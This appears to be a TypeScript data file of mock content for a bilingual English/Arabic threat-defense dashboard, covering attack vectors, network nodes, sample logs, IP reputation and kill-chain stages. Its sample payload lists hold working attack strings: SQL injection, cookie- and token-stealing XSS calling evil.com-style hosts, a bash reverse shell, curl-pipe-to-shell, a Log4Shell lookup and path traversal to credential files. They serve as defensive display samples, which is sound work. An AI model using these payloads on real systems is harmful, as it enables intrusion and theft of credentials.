import { AttackVectorConfig, AttackVectorType, IngestedDataset, NetworkEdge, NetworkNode, ThreatIntelligenceMetrics, GeoThreatNode, KillChainStage } from '../types';

export const ATTACK_VECTORS: AttackVectorConfig[] = [
  {
    id: 'SSH_BRUTE_FORCE',
    nameEn: 'SSH Credential Brute-Force',
    nameAr: 'هجوم القوة الغاشمة لخدمة SSH',
    mitreId: 'T1110.001',
    category: 'Credential Access',
    defaultPort: 22,
    severity: 'HIGH',
    cveOrRef: 'MITRE T1110.001',
    descriptionEn: 'Automated high-velocity SSH login attempts with dictionary wordlists targeting root and service credentials.',
    descriptionAr: 'محاولات تسجيل دخول مؤتمتة وسريعة لخدمة SSH عبر قواميس تخمين الحسابات المستهدفة لمدراء النظام.',
    samplePayloads: [
      'SSH-2.0-OpenSSH_8.4p1 [Failed auth for root from 203.0.113.88]',
      'SSH-2.0-libssh2_1.9.0 [Invalid user admin, 24 failed attempts in 2s]',
      'SSH-2.0-paramiko_2.7.2 [Burst auth failure: user test/oracle/postgres]'
    ]
  },
  {
    id: 'SQL_INJECTION',
    nameEn: 'SQL Injection (SQLi) Payload',
    nameAr: 'حقن قواعد البيانات (SQLi)',
    mitreId: 'T1190 / OWASP A03',
    category: 'Initial Access & Exfiltration',
    defaultPort: 443,
    severity: 'CRITICAL',
    cveOrRef: 'CWE-89 / OWASP Top 10',
    descriptionEn: 'Injection of malicious SQL fragments to bypass authentication, dump schema tables, or execute stacked queries.',
    descriptionAr: 'حقن استعلامات SQL خبيثة للالتفاف على المصادقة أو استخراج جداول العملاء أو تنفيذ أوامر مكدسة.',
    samplePayloads: [
      "' UNION SELECT null, username, password_hash, email FROM users-- -",
      "1' OR '1'='1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)-- -",
      "admin' AND 1=1; WAITFOR DELAY '0:0:5'--"
    ]
  },
  {
    id: 'DNS_EXFILTRATION',
    nameEn: 'DNS Tunneling & Data Exfiltration',
    nameAr: 'تسريب البيانات عبر أنفاق DNS',
    mitreId: 'T1048.003',
    category: 'Exfiltration',
    defaultPort: 53,
    severity: 'CRITICAL',
    cveOrRef: 'MITRE T1048.003',
    descriptionEn: 'Stealthy data exfiltration encoding sensitive database chunks into high-entropy subdomain lookup requests.',
    descriptionAr: 'تسريب سري للمعلومات المشفرة عبر تجزئة بيانات الاعتماد داخل استعلامات نطاقات فرعية عالية العشوائية.',
    samplePayloads: [
      "cGFzc3dkX2hhc2hfZXhmaWw.chunk01.ns1.darkmatter-c2.cc",
      "NjQ3MDk4MTkyMzQ1Nzg5MA.user_cc_data.beacon.exfil-c2.net",
      "ZXhwbG9pdF9wYXlsb2FkX3N5bmM.session_tok.dns-tunnel.org"
    ]
  },
  {
    id: 'LATERAL_MOVEMENT',
    nameEn: 'Internal Lateral Movement',
    nameAr: 'الحركة الجانبية داخل الشبكة',
    mitreId: 'T1021.002 / T1071',
    category: 'Lateral Movement',
    defaultPort: 445,
    severity: 'HIGH',
    cveOrRef: 'MITRE T1021.002',
    descriptionEn: 'Compromised bastion host pivoting towards internal database cluster via SMB/RDP/WinRM credentials reuse.',
    descriptionAr: 'انتقال المهاجم من خادم وسيط مخترق نحو خوادم قواعد البيانات الحساسة عبر بروتوكولات SMB/RDP الداخلية.',
    samplePayloads: [
      "SMB2 TREE_CONNECT to \\\\10.0.0.8\\ADMIN$ with captured NTLMv2 hash",
      "RDP PDU connect 10.0.0.8:3389 [Pass-The-Hash privilege escalation]",
      "WinRM POST /wsman [Encrypted PSexec remote process spawn]"
    ]
  },
  {
    id: 'XSS_ATTACK',
    nameEn: 'Cross-Site Scripting (XSS)',
    nameAr: 'البرمجة النصية عبر المواقع (XSS)',
    mitreId: 'OWASP A03 / T1059.007',
    category: 'Execution',
    defaultPort: 443,
    severity: 'MEDIUM',
    cveOrRef: 'CWE-79',
    descriptionEn: 'Reflected and DOM-based script injections designed to harvest admin session cookies and inject keystroke loggers.',
    descriptionAr: 'حقن نصوص برمجية خبيثة في متصفحات المستخدمين لسرقة ملفات تعريف الارتباط والسيطرة على الجلسات.',
    samplePayloads: [
      '<svg/onload=fetch("//c2.evil.com/steal?c="+encodeURIComponent(document.cookie))>',
      '"><script src="https://cdn.attacker-c2.com/payload.js"></script>',
      '<img src=x onerror="new Image().src=\'http://185.220.101.5:8080/?tok=\'+localStorage.getItem(\'token\')">'
    ]
  },
  {
    id: 'DDOS_AMPLIFICATION',
    nameEn: 'L7 HTTP Flood & DDoS Amplification',
    nameAr: 'هجوم حجب الخدمة الموزع (DDoS)',
    mitreId: 'T1498.002',
    category: 'Impact',
    defaultPort: 80,
    severity: 'HIGH',
    cveOrRef: 'MITRE T1498.002',
    descriptionEn: 'Distributed layer 7 volumetric HTTP GET flood and Slowloris socket exhaustion targeting API endpoints.',
    descriptionAr: 'طوفان طلبات HTTP حجب خدمة عالي الكثافة مع هجمات Slowloris لاستنزاف مقابس الخادم.',
    samplePayloads: [
      'GET /api/v1/search?q=stress_test_flood HTTP/1.1 [50,000 req/sec spoofed source IPs]',
      'Slowloris partial headers: X-a: b [Keep-alive hold 10,000 open connections]',
      'UDP NTP Reflection amplification factor 556x towards edge router'
    ]
  },
  {
    id: 'PATH_TRAVERSAL',
    nameEn: 'Directory / Path Traversal',
    nameAr: 'تخطي مسارات النظام وقراءة الملفات',
    mitreId: 'T1083 / CWE-22',
    category: 'Discovery',
    defaultPort: 443,
    severity: 'HIGH',
    cveOrRef: 'CWE-22',
    descriptionEn: 'Navigating out of webroot directories via dot-dot-slash patterns to access sensitive configuration files.',
    descriptionAr: 'محاولة استعراض مسارات نظام التشغيل المحمية لقراءة ملفات الإعدادات والبيئة الحساسة (.env, /etc/passwd).',
    samplePayloads: [
      '/api/download?file=../../../../../../etc/passwd',
      '/static/..%2f..%2f..%2f.env',
      'GET /wp-content/plugins/wp-file-manager/lib/files/../../../config/database.yml'
    ]
  },
  {
    id: 'REMOTE_CODE_EXECUTION',
    nameEn: 'Remote Command Execution (RCE)',
    nameAr: 'تنفيذ الأوامر عن بُعد (RCE)',
    mitreId: 'T1210 / CWE-78',
    category: 'Execution',
    defaultPort: 443,
    severity: 'CRITICAL',
    cveOrRef: 'CWE-78 / OWASP A03',
    descriptionEn: 'Injecting shell metacharacters and piping remote reverse shell connections directly into the host OS.',
    descriptionAr: 'حقن وسائط ومحارف خاصة بالشيل لتنفيذ أوامر نظام التشغيل وفتح اتصالات عكسية (Reverse Shell).',
    samplePayloads: [
      '; /bin/bash -c "bash -i >& /dev/tcp/185.220.101.5/4444 0>&1"',
      '$(curl -s http://attacker.cc/shell.sh | sh)',
      '${jndi:ldap://log4j-c2.threat-actor.org:1389/Exploit}'
    ]
  }
];

export const INITIAL_NETWORK_NODES: NetworkNode[] = [
  {
    id: 'node-attacker',
    labelEn: 'External Threat Actor / Botnet',
    labelAr: 'المهاجم الخارجي / شبكة البوتات',
    ip: '203.0.113.88',
    type: 'ATTACKER',
    status: 'ONLINE',
    activeConnections: 142,
    riskScore: 96,
    x: 80,
    y: 190,
    ports: [4444, 8080, 53],
    os: 'Kali Linux Rolling (C2 Node)',
    firewallRulesCount: 0
  },
  {
    id: 'node-gateway',
    labelEn: 'Edge Ingress Router & BGP',
    labelAr: 'موجه الحافة الخارجي وجدار الحماية',
    ip: '10.0.0.1',
    type: 'GATEWAY',
    status: 'PROTECTED',
    activeConnections: 890,
    riskScore: 12,
    x: 290,
    y: 190,
    ports: [80, 443, 53],
    os: 'Cisco IOS-XE / VyOS Linux',
    firewallRulesCount: 148
  },
  {
    id: 'node-defender',
    labelEn: 'Sovereign AI Defense Agent (eBPF)',
    labelAr: 'وكيل الدفاع الذاتي (eBPF و IPTables)',
    ip: '10.0.0.2',
    type: 'DEFENDER',
    status: 'PROTECTED',
    activeConnections: 1250,
    riskScore: 2,
    x: 500,
    y: 80,
    ports: [3000, 9100],
    os: 'Hardened Linux Kernel 6.8 + eBPF XDP',
    firewallRulesCount: 342
  },
  {
    id: 'node-web',
    labelEn: 'Target Web Application (Nginx/API)',
    labelAr: 'خادم الويب والتطبيقات (Nginx / Node)',
    ip: '10.0.0.5',
    type: 'WEB_SERVER',
    status: 'ONLINE',
    activeConnections: 450,
    riskScore: 24,
    x: 500,
    y: 300,
    ports: [80, 443, 22],
    os: 'Ubuntu 24.04 LTS (Production Tier)',
    firewallRulesCount: 86
  },
  {
    id: 'node-db',
    labelEn: 'Database Tier (PostgreSQL / Core Data)',
    labelAr: 'قاعدة البيانات الحساسة (PostgreSQL)',
    ip: '10.0.0.8',
    type: 'DATABASE',
    status: 'PROTECTED',
    activeConnections: 85,
    riskScore: 8,
    x: 740,
    y: 300,
    ports: [5432, 22],
    os: 'Debian 12 Hardened PostgreSQL 16',
    firewallRulesCount: 92
  },
  {
    id: 'node-honeypot',
    labelEn: 'Cyber Deception Honeypot System',
    labelAr: 'مصيدة الخداع السيبراني (Honeypot)',
    ip: '10.0.99.5',
    type: 'HONEYPOT',
    status: 'ONLINE',
    activeConnections: 34,
    riskScore: 88,
    x: 740,
    y: 80,
    ports: [22, 3389, 445, 8080],
    os: 'Cowrie / Dionaea Deception Node',
    firewallRulesCount: 15
  },
  {
    id: 'node-bastion',
    labelEn: 'Internal Bastion & Admin Node',
    labelAr: 'خادم الإدارة والوسيط الداخلي',
    ip: '10.0.0.15',
    type: 'BASTION',
    status: 'ONLINE',
    activeConnections: 12,
    riskScore: 18,
    x: 930,
    y: 190,
    ports: [22, 3389],
    os: 'Red Hat Enterprise Linux 9',
    firewallRulesCount: 45
  }
];

export const INITIAL_NETWORK_EDGES: NetworkEdge[] = [
  { id: 'e-att-gw', source: 'node-attacker', target: 'node-gateway', active: true, threatLevel: 'HIGH', packetsCount: 4120 },
  { id: 'e-gw-def', source: 'node-gateway', target: 'node-defender', active: true, threatLevel: 'NONE', packetsCount: 8900 },
  { id: 'e-def-web', source: 'node-defender', target: 'node-web', active: true, threatLevel: 'NONE', packetsCount: 6540 },
  { id: 'e-gw-web', source: 'node-gateway', target: 'node-web', active: true, threatLevel: 'MEDIUM', packetsCount: 2310 },
  { id: 'e-web-db', source: 'node-web', target: 'node-db', active: true, threatLevel: 'NONE', packetsCount: 3890 },
  { id: 'e-def-hp', source: 'node-defender', target: 'node-honeypot', active: true, threatLevel: 'HIGH', packetsCount: 940 },
  { id: 'e-web-bast', source: 'node-web', target: 'node-bastion', active: false, threatLevel: 'NONE', packetsCount: 140 },
  { id: 'e-bast-db', source: 'node-bastion', target: 'node-db', active: false, threatLevel: 'NONE', packetsCount: 80 }
];

export const SAMPLE_DATASETS: IngestedDataset[] = [
  {
    id: 'ds-owasp-2025',
    name: 'OWASP Top 10 Live Attack Feed (2025)',
    type: 'WAF_JSON',
    uploadedAt: '2026-08-29 11:30',
    recordsCount: 14500,
    parsedAttacks: 3820,
    topVectors: [
      { vector: 'SQL_INJECTION', count: 1420 },
      { vector: 'REMOTE_CODE_EXECUTION', count: 980 },
      { vector: 'PATH_TRAVERSAL', count: 820 },
      { vector: 'XSS_ATTACK', count: 600 }
    ],
    status: 'ACTIVE_IN_MEMORY',
    sampleRaw: `{"timestamp":"2026-08-29T11:29:45Z","client_ip":"198.51.100.42","method":"POST","uri":"/api/v1/auth/login","headers":{"User-Agent":"sqlmap/1.7.2#stable","Content-Type":"application/json"},"body":"{\\"username\\":\\"admin' OR 1=1--\\",\\"password\\":\\"x\\"}","rule_triggered":"CRS-942100-SQLi"}`
  },
  {
    id: 'ds-nginx-prod',
    name: 'Production Nginx Web Logs with Zero-Day Probes',
    type: 'NGINX_LOG',
    uploadedAt: '2026-08-29 09:15',
    recordsCount: 48200,
    parsedAttacks: 6240,
    topVectors: [
      { vector: 'PATH_TRAVERSAL', count: 2890 },
      { vector: 'SQL_INJECTION', count: 1840 },
      { vector: 'DDOS_AMPLIFICATION', count: 1510 }
    ],
    status: 'ACTIVE_IN_MEMORY',
    sampleRaw: `185.220.101.5 - - [29/Aug/2026:09:14:22 +0000] "GET /static/..%2f..%2f.env HTTP/1.1" 404 162 "-" "Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)"
194.26.29.112 - - [29/Aug/2026:09:14:25 +0000] "GET /wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php HTTP/1.1" 403 230 "-" "Nikto/2.1.6"`
  },
  {
    id: 'ds-modsec-waf',
    name: 'ModSecurity WAF Alert Dump (OWASP CRS v4)',
    type: 'MODSECURITY',
    uploadedAt: '2026-08-29 08:00',
    recordsCount: 8900,
    parsedAttacks: 8900,
    topVectors: [
      { vector: 'SQL_INJECTION', count: 4100 },
      { vector: 'XSS_ATTACK', count: 2600 },
      { vector: 'REMOTE_CODE_EXECUTION', count: 2200 }
    ],
    status: 'ACTIVE_IN_MEMORY',
    sampleRaw: `[client 203.0.113.88] ModSecurity: Warning. Pattern match "(?i:(?:select\\\\s+.*\\\\s+from|insert\\\\s+into|union\\\\s+select))" at ARGS:id. [file "/etc/modsecurity/owasp-crs/rules/REQUEST-942-APPLICATION-ATTACK-SQLI.conf"] [id "942100"] [msg "SQL Injection Attack Detected via libinjection"] [severity "CRITICAL"]`
  },
  {
    id: 'ds-pcap-dns',
    name: 'PCAP JSON Stream - Cobalt Strike DNS C2 Beacons',
    type: 'PCAP_JSON',
    uploadedAt: '2026-08-29 07:45',
    recordsCount: 12400,
    parsedAttacks: 1950,
    topVectors: [
      { vector: 'DNS_EXFILTRATION', count: 1950 }
    ],
    status: 'ACTIVE_IN_MEMORY',
    sampleRaw: `{"timestamp":"1724915100.120","protocol":"DNS","query_type":"TXT","query_name":"cGFzc3dvcmRfZHVtcF9jaHVuazAx.beacon.c2-exfil.xyz","src_ip":"10.0.0.15","dst_ip":"1.1.1.1","entropy":4.92,"size_bytes":512}`
  }
];

export const INITIAL_INTEL_METRICS: ThreatIntelligenceMetrics = {
  totalIngestedLogs: 84000,
  knownMaliciousIps: 1842,
  zeroDaySignatures: 126,
  aiDetectionAccuracy: 99.4,
  falsePositiveRate: 0.12,
  topTargetedUrls: [
    { url: '/api/v1/auth/login', hits: 14200, threatLevel: 'CRITICAL' },
    { url: '/.env', hits: 8930, threatLevel: 'CRITICAL' },
    { url: '/wp-admin/admin-ajax.php', hits: 6420, threatLevel: 'HIGH' },
    { url: '/api/v1/orders/export', hits: 5120, threatLevel: 'HIGH' },
    { url: '/graphql', hits: 3900, threatLevel: 'MEDIUM' },
    { url: '/phpmyadmin/index.php', hits: 2840, threatLevel: 'HIGH' },
    { url: '/actuator/gateway/routes', hits: 1950, threatLevel: 'CRITICAL' }
  ],
  topUserAgents: [
    { ua: 'sqlmap/1.7.2#stable (Automated Database Exploiter)', malicious: true, count: 12400 },
    { ua: 'Mozilla/5.0 (compatible; Nmap Scripting Engine)', malicious: true, count: 8600 },
    { ua: 'Nikto/2.1.6 (Web Server Vulnerability Scanner)', malicious: true, count: 6400 },
    { ua: 'Go-http-client/1.1 (Mass Scanner)', malicious: true, count: 4200 },
    { ua: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/130.0.0.0', malicious: false, count: 45000 }
  ],
  ipReputationScores: [
    { ip: '203.0.113.88', reputation: 98, category: 'Botnet C2 & SSH Brute-Force', country: 'RU', lastSeen: '2026-08-29 11:32', status: 'ACTIVE_BLOCK' },
    { ip: '185.220.101.5', reputation: 95, category: 'Tor Exit Node / Path Traversal', country: 'DE', lastSeen: '2026-08-29 11:30', status: 'ACTIVE_BLOCK' },
    { ip: '194.26.29.112', reputation: 92, category: 'Nikto & ModSec Exploit Scanner', country: 'NL', lastSeen: '2026-08-29 11:28', status: 'ACTIVE_BLOCK' },
    { ip: '45.148.10.22', reputation: 88, category: 'Cobalt Strike DNS Tunnel Exfiltration', country: 'BG', lastSeen: '2026-08-29 11:25', status: 'ACTIVE_BLOCK' },
    { ip: '198.51.100.42', reputation: 84, category: 'OWASP SQLi Payload Injector', country: 'US', lastSeen: '2026-08-29 11:20', status: 'SUSPICIOUS' },
    { ip: '10.0.0.1', reputation: 0, category: 'Whitelisted Core Edge Gateway', country: 'INTERNAL', lastSeen: 'Active', status: 'NEUTRAL' }
  ]
};

export const INITIAL_GEO_THREATS: GeoThreatNode[] = [
  {
    id: 'geo-1',
    ip: '203.0.113.88',
    country: 'Russia',
    countryCode: 'RU',
    flag: '🇷🇺',
    asn: 'AS48209 (Mirai & SSH Botnet)',
    city: 'St. Petersburg',
    threatLevel: 'CRITICAL',
    attackType: 'SSH Brute-Force & C2 Pivot',
    packetsSent: 14820,
    targetAsset: '10.0.0.2 (eBPF Defender)',
    divertedToHoneypot: false,
    x: 620,
    y: 110,
    latencyMs: 142
  },
  {
    id: 'geo-2',
    ip: '185.220.101.5',
    country: 'Germany',
    countryCode: 'DE',
    flag: '🇩🇪',
    asn: 'AS208294 (Tor Exit Relay)',
    city: 'Frankfurt',
    threatLevel: 'HIGH',
    attackType: 'Path Traversal & .env Leak',
    packetsSent: 8450,
    targetAsset: '10.0.0.5 (Web Nginx)',
    divertedToHoneypot: false,
    x: 480,
    y: 140,
    latencyMs: 88
  },
  {
    id: 'geo-3',
    ip: '194.26.29.112',
    country: 'Netherlands',
    countryCode: 'NL',
    flag: '🇳🇱',
    asn: 'AS60117 (Nikto Exploit Scanner)',
    city: 'Amsterdam',
    threatLevel: 'HIGH',
    attackType: 'SQLi & Automated Exploiter',
    packetsSent: 6120,
    targetAsset: '10.0.0.5 (Web Nginx)',
    divertedToHoneypot: false,
    x: 460,
    y: 130,
    latencyMs: 76
  },
  {
    id: 'geo-4',
    ip: '45.148.10.22',
    country: 'Bulgaria',
    countryCode: 'BG',
    flag: '🇧🇬',
    asn: 'AS39798 (Cobalt Strike C2)',
    city: 'Sofia',
    threatLevel: 'CRITICAL',
    attackType: 'DNS Tunneling Exfiltration',
    packetsSent: 9400,
    targetAsset: '10.0.0.8 (PostgreSQL Vault)',
    divertedToHoneypot: true,
    x: 540,
    y: 170,
    latencyMs: 115
  },
  {
    id: 'geo-5',
    ip: '198.51.100.42',
    country: 'United States',
    countryCode: 'US',
    flag: '🇺🇸',
    asn: 'AS15169 (Proxy / Scanner)',
    city: 'San Jose',
    threatLevel: 'MEDIUM',
    attackType: 'OWASP Top 10 Probing',
    packetsSent: 3200,
    targetAsset: '10.0.0.1 (Ingress Gateway)',
    divertedToHoneypot: false,
    x: 220,
    y: 160,
    latencyMs: 168
  }
];

export const INITIAL_KILL_CHAIN_STAGES: KillChainStage[] = [
  {
    id: 'kc-1',
    stepNumber: 1,
    titleEn: '1. Reconnaissance & Scanning',
    titleAr: '1. الاستطلاع وفحص المنافذ',
    mitreTactic: 'Reconnaissance (TA0043)',
    techniqueId: 'T1595.002',
    status: 'ACTIVE',
    executingNodeId: 'node-attacker',
    descriptionEn: 'Automated Port Sweep & Service Enumeration (Nmap / Masscan probing ports 22, 80, 443, 3389).',
    descriptionAr: 'مسح مؤتمت لمنافذ الشبكة واستكشاف الخدمات المتاحة للثغرات.',
    mitigationRule: 'Rate-limiting & SYN cookie verification via eBPF XDP.'
  },
  {
    id: 'kc-2',
    stepNumber: 2,
    titleEn: '2. Initial Access Exploitation',
    titleAr: '2. الوصول الأولي واستغلال الثغرات',
    mitreTactic: 'Initial Access (TA0001)',
    techniqueId: 'T1190 / T1110',
    status: 'BLOCKED_KERNEL',
    executingNodeId: 'node-gateway',
    descriptionEn: 'Exploitation vector: SQL Injection & SSH Credential Brute-Force against exposed perimeter services.',
    descriptionAr: 'محاولة استغلال ثغرات حقن SQL أو هجمات القوة الغاشمة لخدمة SSH.',
    mitigationRule: 'IPTables DROP + WAF deep regex validation & IPSet quarantine.'
  },
  {
    id: 'kc-3',
    stepNumber: 3,
    titleEn: '3. Defense Evasion & Sandbox Trapping',
    titleAr: '3. الالتفاف على الدفاع وفخ التضليل',
    mitreTactic: 'Defense Evasion (TA0005)',
    techniqueId: 'T1027 / T1562',
    status: 'DIVERTED_HONEYPOT',
    executingNodeId: 'node-honeypot',
    descriptionEn: 'Attacker payload redirected silently to Cowrie / Dionaea deception honeypot (10.0.99.5) to capture zero-day telemetry.',
    descriptionAr: 'توجيه المهاجم خلسة إلى مصيدة الخداع السيبراني المعزولة لتسجيل الأوامر والبصمات.',
    mitigationRule: 'Dynamic DNAT redirection to sandbox cluster with full TTY logging.'
  },
  {
    id: 'kc-4',
    stepNumber: 4,
    titleEn: '4. Internal Lateral Movement',
    titleAr: '4. محاولة الحركة الجانبية الداخلية',
    mitreTactic: 'Lateral Movement (TA0008)',
    techniqueId: 'T1021.002 / T1071',
    status: 'SEVERED_BY_DEFENDER',
    executingNodeId: 'node-defender',
    descriptionEn: 'Pivot attempt from DMZ web tier towards internal PostgreSQL database vault (10.0.0.8).',
    descriptionAr: 'محاولة اختراق داخلي من خادم الويب نحو قاعدة البيانات الحساسة.',
    mitigationRule: 'Zero-Trust microsegmentation policy severed internal socket connections.'
  },
  {
    id: 'kc-5',
    stepNumber: 5,
    titleEn: '5. Data Exfiltration & C2 Beacons',
    titleAr: '5. تسريب البيانات والاتصال بالقيادة (C2)',
    mitreTactic: 'Exfiltration (TA0010)',
    techniqueId: 'T1048.003 (DNS Tunnel)',
    status: 'SEVERED_BY_DEFENDER',
    executingNodeId: 'node-db',
    descriptionEn: 'DNS tunneling exfiltration of encoded chunks blocked before egress.',
    descriptionAr: 'محاولة تسريب بيانات مشفرة عبر أنفاق استعلامات DNS المقطوعة تماماً.',
    mitigationRule: 'High-entropy DNS query drop rule enforced at kernel boundary.'
  }
];

